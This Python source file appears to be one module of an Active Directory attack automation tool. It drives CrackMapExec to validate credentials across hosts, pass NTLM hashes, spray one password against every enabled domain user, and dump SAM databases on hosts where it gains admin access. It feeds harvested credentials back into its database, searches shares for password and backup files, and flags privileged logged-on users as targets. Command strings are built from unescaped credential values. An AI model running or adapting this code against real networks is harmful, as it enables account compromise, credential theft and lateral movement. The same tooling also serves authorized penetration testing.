#!/usr/bin/env python3
"""
CrackMapExec Enumeration Module for AD-Automaton
Handles mass authentication, access mapping, and authenticated enumeration using CrackMapExec.
"""

import os
import re
import logging
from typing import List, Dict, Any, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Host, Credential, ValidCredential, Share, User
from executor import CommandExecutor
from parsers import CrackMapExecParser
from logger import log_discovery, log_tool_execution, log_tool_result

class CrackMapExecEnumerator:
    """
    Handles CrackMapExec-based enumeration including credential validation,
    lateral movement discovery, and post-authentication enumeration.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the CME enumerator.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = CrackMapExecParser()
        
        # Get CME configuration
        self.cme_config = config.get('tools', {}).get('crackmapexec', {})
        self.cme_path = self.cme_config.get('path', 'crackmapexec')
        
        # Threading configuration
        self.max_threads = int(self.cme_config.get('threads', '25'))
        self.timeout = int(self.cme_config.get('timeout', '30'))
        self.delay = int(self.cme_config.get('delay', '0'))
        
        # State tracking
        self.tested_combinations = set()
        self.successful_logins = []
    
    def run_credential_validation(self) -> List[ValidCredential]:
        """
        Main method to run credential validation across all hosts.
        
        Returns:
            List of valid credential mappings
        """
        self.logger.info("Starting CrackMapExec credential validation")
        
        # Get untested credentials and all hosts
        credentials = self.db_manager.get_untested_credentials()
        hosts = self.db_manager.get_hosts()
        
        if not credentials:
            self.logger.warning("No untested credentials found")
            return []
        
        if not hosts:
            self.logger.warning("No hosts found for testing")
            return []
        
        self.logger.info(f"Testing {len(credentials)} credentials against {len(hosts)} hosts")
        
        # Run mass authentication
        valid_credentials = self._run_mass_authentication(credentials, hosts)
        
        # For each successful login with admin access, run deep enumeration
        for valid_cred in valid_credentials:
            if valid_cred.access_level == 'ADMIN':
                self._run_deep_enumeration(valid_cred)
        
        # Store results
        self._store_valid_credentials(valid_credentials)
        
        log_discovery("valid credential mappings", len(valid_credentials))
        
        return valid_credentials
    
    def _run_mass_authentication(self, credentials: List[Credential], hosts: List[Host]) -> List[ValidCredential]:
        """
        Run mass authentication testing using CME.
        
        Args:
            credentials: List of credentials to test
            hosts: List of hosts to test against
            
        Returns:
            List of valid credential mappings
        """
        valid_credentials = []
        
        # Group credentials by type for efficient testing
        password_creds = [c for c in credentials if c.password]
        hash_creds = [c for c in credentials if c.hash_value and not c.password]
        
        # Test password-based credentials
        if password_creds:
            self.logger.info(f"Testing {len(password_creds)} password-based credentials")
            password_results = self._test_password_credentials(password_creds, hosts)
            valid_credentials.extend(password_results)
        
        # Test hash-based credentials (pass-the-hash)
        if hash_creds:
            self.logger.info(f"Testing {len(hash_creds)} hash-based credentials")
            hash_results = self._test_hash_credentials(hash_creds, hosts)
            valid_credentials.extend(hash_results)
        
        return valid_credentials
    
    def _test_password_credentials(self, credentials: List[Credential], hosts: List[Host]) -> List[ValidCredential]:
        """
        Test password-based credentials using CME.
        
        Args:
            credentials: Password-based credentials
            hosts: Target hosts
            
        Returns:
            List of valid credential mappings
        """
        valid_creds = []
        
        for credential in credentials:
            # Build target list
            target_ips = [host.ip_address for host in hosts]
            targets = ' '.join(target_ips)
            
            # Construct CME command
            username = credential.username
            password = credential.password
            domain = credential.domain if credential.domain else ""
            
            if domain:
                user_arg = f"{domain}\\{username}"
            else:
                user_arg = username
            
            command = self._build_cme_command('smb', targets, user_arg, password)
            
            try:
                log_tool_execution("crackmapexec password test", 
                                 f"{command} (testing {username})")
                
                result = self.executor.execute(command, timeout=self.timeout * len(hosts))
                
                log_tool_result("crackmapexec password test", result.exit_code, 
                              len(result.stdout.splitlines()) if result.stdout else 0)
                
                if result.exit_code == 0:
                    # Parse authentication results
                    auth_results = self.parser.parse_authentication_results(result.stdout)
                    
                    for auth_result in auth_results:
                        if auth_result['success']:
                            # Find corresponding host
                            host = self._find_host_by_ip(hosts, auth_result['ip'])
                            if host:
                                valid_cred = ValidCredential(
                                    host_id=host.host_id,
                                    cred_id=credential.cred_id,
                                    access_level=auth_result['access_level']
                                )
                                valid_creds.append(valid_cred)
                
                # Add delay between credential tests if configured
                if self.delay > 0:
                    time.sleep(self.delay)
                
            except Exception as e:
                self.logger.error(f"Password testing failed for {username}: {e}")
                continue
        
        return valid_creds
    
    def _test_hash_credentials(self, credentials: List[Credential], hosts: List[Host]) -> List[ValidCredential]:
        """
        Test hash-based credentials using pass-the-hash.
        
        Args:
            credentials: Hash-based credentials
            hosts: Target hosts
            
        Returns:
            List of valid credential mappings
        """
        valid_creds = []
        
        for credential in credentials:
            # Only test NTLM hashes
            if credential.hash_type != 'NTLM':
                continue
            
            # Build target list
            target_ips = [host.ip_address for host in hosts]
            targets = ' '.join(target_ips)
            
            # Construct CME command for pass-the-hash
            username = credential.username
            hash_value = credential.hash_value
            domain = credential.domain if credential.domain else ""
            
            if domain:
                user_arg = f"{domain}\\{username}"
            else:
                user_arg = username
            
            command = self._build_cme_command('smb', targets, user_arg, None, hash_value)
            
            try:
                log_tool_execution("crackmapexec hash test", 
                                 f"{command} (testing {username} hash)")
                
                result = self.executor.execute(command, timeout=self.timeout * len(hosts))
                
                if result.exit_code == 0:
                    # Parse authentication results
                    auth_results = self.parser.parse_authentication_results(result.stdout)
                    
                    for auth_result in auth_results:
                        if auth_result['success']:
                            # Find corresponding host
                            host = self._find_host_by_ip(hosts, auth_result['ip'])
                            if host:
                                valid_cred = ValidCredential(
                                    host_id=host.host_id,
                                    cred_id=credential.cred_id,
                                    access_level=auth_result['access_level']
                                )
                                valid_creds.append(valid_cred)
                
                # Add delay between credential tests
                if self.delay > 0:
                    time.sleep(self.delay)
                
            except Exception as e:
                self.logger.error(f"Hash testing failed for {username}: {e}")
                continue
        
        return valid_creds
    
    def _run_deep_enumeration(self, valid_cred: ValidCredential) -> None:
        """
        Run deep enumeration on a host where we have admin access.
        
        Args:
            valid_cred: Valid credential with admin access
        """
        # Get host and credential details
        hosts = self.db_manager.get_hosts()
        credentials = self.db_manager.get_credentials()
        
        host = next((h for h in hosts if h.host_id == valid_cred.host_id), None)
        credential = next((c for c in credentials if c.cred_id == valid_cred.cred_id), None)
        
        if not host or not credential:
            return
        
        self.logger.info(f"Running deep enumeration on {host.ip_address} with admin access")
        
        # Enumerate shares
        self._enumerate_shares_cme(host, credential)
        
        # Enumerate logged-on users
        self._enumerate_loggedon_users_cme(host, credential)
        
        # Dump SAM database
        self._dump_sam_cme(host, credential)
        
        # Enumerate local users
        self._enumerate_local_users_cme(host, credential)
        
        # Check for interesting files/directories
        self._check_interesting_files_cme(host, credential)
    
    def _enumerate_shares_cme(self, host: Host, credential: Credential) -> None:
        """Enumerate shares using CME."""
        try:
            user_arg = self._build_user_arg(credential)
            auth_arg = self._build_auth_arg(credential)
            
            command = f"{self.cme_path} smb {host.ip_address} {user_arg} {auth_arg} --shares"
            
            log_tool_execution("crackmapexec shares", command)
            result = self.executor.execute(command, timeout=60)
            
            if result.exit_code == 0:
                shares = self.parser.parse_shares(result.stdout)
                
                # Store shares in database
                for host_ip, share in shares:
                    share.host_id = host.host_id
                    self.db_manager.add_share(share)
                
                self.logger.info(f"Enumerated {len(shares)} shares on {host.ip_address}")
            
        except Exception as e:
            self.logger.error(f"Share enumeration failed on {host.ip_address}: {e}")
    
    def _enumerate_loggedon_users_cme(self, host: Host, credential: Credential) -> None:
        """Enumerate logged-on users using CME."""
        try:
            user_arg = self._build_user_arg(credential)
            auth_arg = self._build_auth_arg(credential)
            
            command = f"{self.cme_path} smb {host.ip_address} {user_arg} {auth_arg} --loggedon-users"
            
            log_tool_execution("crackmapexec logged-on users", command)
            result = self.executor.execute(command, timeout=60)
            
            if result.exit_code == 0 and 'Logged On Users' in result.stdout:
                self.logger.info(f"Found logged-on users on {host.ip_address}")
                # Log interesting users for targeting
                self._analyze_loggedon_users(result.stdout, host)
            
        except Exception as e:
            self.logger.error(f"Logged-on user enumeration failed on {host.ip_address}: {e}")
    
    def _dump_sam_cme(self, host: Host, credential: Credential) -> None:
        """Dump SAM database using CME."""
        try:
            user_arg = self._build_user_arg(credential)
            auth_arg = self._build_auth_arg(credential)
            
            command = f"{self.cme_path} smb {host.ip_address} {user_arg} {auth_arg} --sam"
            
            log_tool_execution("crackmapexec SAM dump", command)
            result = self.executor.execute(command, timeout=120)
            
            if result.exit_code == 0:
                # Parse SAM dump for new credentials
                new_credentials = self.parser.parse_sam_dump(result.stdout)
                
                # Store new credentials in database
                for new_cred in new_credentials:
                    cred_id = self.db_manager.add_credential(new_cred)
                    if cred_id:
                        self.logger.info(f"Added new credential from SAM: {new_cred.username}")
                
                self.logger.info(f"Dumped SAM on {host.ip_address}, found {len(new_credentials)} credentials")
            
        except Exception as e:
            self.logger.error(f"SAM dump failed on {host.ip_address}: {e}")
    
    def _enumerate_local_users_cme(self, host: Host, credential: Credential) -> None:
        """Enumerate local users using CME."""
        try:
            user_arg = self._build_user_arg(credential)
            auth_arg = self._build_auth_arg(credential)
            
            command = f"{self.cme_path} smb {host.ip_address} {user_arg} {auth_arg} --local-users"
            
            log_tool_execution("crackmapexec local users", command)
            result = self.executor.execute(command, timeout=60)
            
            if result.exit_code == 0:
                self.logger.info(f"Enumerated local users on {host.ip_address}")
            
        except Exception as e:
            self.logger.error(f"Local user enumeration failed on {host.ip_address}: {e}")
    
    def _check_interesting_files_cme(self, host: Host, credential: Credential) -> None:
        """Check for interesting files using CME."""
        try:
            user_arg = self._build_user_arg(credential)
            auth_arg = self._build_auth_arg(credential)
            
            # Look for common interesting files
            patterns = ['password', 'config', 'backup', 'admin']
            
            for pattern in patterns:
                command = f"{self.cme_path} smb {host.ip_address} {user_arg} {auth_arg} -M spider_plus -o PATTERN={pattern}"
                
                result = self.executor.execute(command, timeout=120)
                
                if result.exit_code == 0 and pattern in result.stdout.lower():
                    self.logger.info(f"Found interesting files matching '{pattern}' on {host.ip_address}")
            
        except Exception as e:
            self.logger.debug(f"File search failed on {host.ip_address}: {e}")
    
    def _build_cme_command(self, protocol: str, targets: str, username: str, 
                          password: Optional[str] = None, hash_value: Optional[str] = None) -> str:
        """
        Build CrackMapExec command with proper arguments.
        
        Args:
            protocol: Protocol to use (smb, winrm, etc.)
            targets: Target specification
            username: Username
            password: Password (optional)
            hash_value: Hash value for pass-the-hash (optional)
            
        Returns:
            Complete CME command string
        """
        base_cmd = f"{self.cme_path} {protocol} {targets}"
        
        # Add threading and timeout options
        if self.max_threads:
            base_cmd += f" --threads {self.max_threads}"
        
        # Add authentication
        base_cmd += f" -u '{username}'"
        
        if password:
            base_cmd += f" -p '{password}'"
        elif hash_value:
            base_cmd += f" -H {hash_value}"
        
        return base_cmd
    
    def _build_user_arg(self, credential: Credential) -> str:
        """Build user argument for CME command."""
        username = credential.username
        domain = credential.domain
        
        if domain:
            return f"-u '{domain}\\{username}'"
        else:
            return f"-u '{username}'"
    
    def _build_auth_arg(self, credential: Credential) -> str:
        """Build authentication argument for CME command."""
        if credential.password:
            return f"-p '{credential.password}'"
        elif credential.hash_value:
            return f"-H {credential.hash_value}"
        else:
            return ""
    
    def _find_host_by_ip(self, hosts: List[Host], ip_address: str) -> Optional[Host]:
        """Find host object by IP address."""
        return next((host for host in hosts if host.ip_address == ip_address), None)
    
    def _analyze_loggedon_users(self, output: str, host: Host) -> None:
        """Analyze logged-on users output for high-value targets."""
        # Look for admin/privileged users
        admin_keywords = ['admin', 'administrator', 'domain admin', 'enterprise admin', 'backup']
        
        for line in output.split('\n'):
            if any(keyword in line.lower() for keyword in admin_keywords):
                self.logger.warning(f"High-value user detected on {host.ip_address}: {line.strip()}")
    
    def _store_valid_credentials(self, valid_credentials: List[ValidCredential]) -> None:
        """Store valid credential mappings in the database."""
        stored_count = 0
        
        for valid_cred in valid_credentials:
            if self.db_manager.add_valid_credential(valid_cred):
                stored_count += 1
        
        self.logger.info(f"Stored {stored_count} valid credential mappings")
    
    def spray_password(self, password: str, delay: int = 1) -> List[ValidCredential]:
        """
        Perform password spraying across all discovered users.
        
        Args:
            password: Password to spray
            delay: Delay between attempts in seconds
            
        Returns:
            List of valid credential mappings
        """
        self.logger.info(f"Starting password spray with password: {password}")
        
        # Get all users from database
        users_query = "SELECT DISTINCT username, domain FROM Users WHERE is_enabled = 1"
        user_results = self.db_manager.execute_query(users_query)
        
        if not user_results:
            self.logger.warning("No users found for password spraying")
            return []
        
        # Get all hosts
        hosts = self.db_manager.get_hosts()
        targets = ' '.join([host.ip_address for host in hosts])
        
        valid_creds = []
        
        for user_data in user_results:
            username = user_data['username']
            domain = user_data.get('domain', '')
            
            # Skip machine accounts
            if username.endswith('$'):
                continue
            
            try:
                # Create credential for testing
                if domain:
                    user_arg = f"{domain}\\{username}"
                else:
                    user_arg = username
                
                command = self._build_cme_command('smb', targets, user_arg, password)
                
                result = self.executor.execute(command, timeout=self.timeout * len(hosts))
                
                if result.exit_code == 0:
                    auth_results = self.parser.parse_authentication_results(result.stdout)
                    
                    for auth_result in auth_results:
                        if auth_result['success']:
                            # Store successful credential
                            credential = Credential(
                                username=username,
                                domain=domain,
                                password=password,
                                source_tool="password_spray"
                            )
                            cred_id = self.db_manager.add_credential(credential)
                            
                            if cred_id:
                                host = self._find_host_by_ip(hosts, auth_result['ip'])
                                if host:
                                    valid_cred = ValidCredential(
                                        host_id=host.host_id,
                                        cred_id=cred_id,
                                        access_level=auth_result['access_level']
                                    )
                                    valid_creds.append(valid_cred)
                
                # Delay between attempts
                time.sleep(delay)
                
            except Exception as e:
                self.logger.error(f"Password spray failed for {username}: {e}")
                continue
        
        self.logger.info(f"Password spray completed, found {len(valid_creds)} valid credentials")
        return valid_creds

def run_credential_validation(db_manager: DatabaseManager, config: Dict[str, Any]) -> List[ValidCredential]:
    """
    Main entry point for credential validation.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        List of valid credential mappings
    """
    enumerator = CrackMapExecEnumerator(db_manager, config)
    return enumerator.run_credential_validation()

def spray_password(db_manager: DatabaseManager, password: str, 
                  config: Dict[str, Any], delay: int = 1) -> List[ValidCredential]:
    """
    Perform password spraying attack.
    
    Args:
        db_manager: Database manager instance
        password: Password to spray
        config: Configuration dictionary
        delay: Delay between attempts
        
    Returns:
        List of valid credential mappings
    """
    enumerator = CrackMapExecEnumerator(db_manager, config)
    return enumerator.spray_password(password, delay) 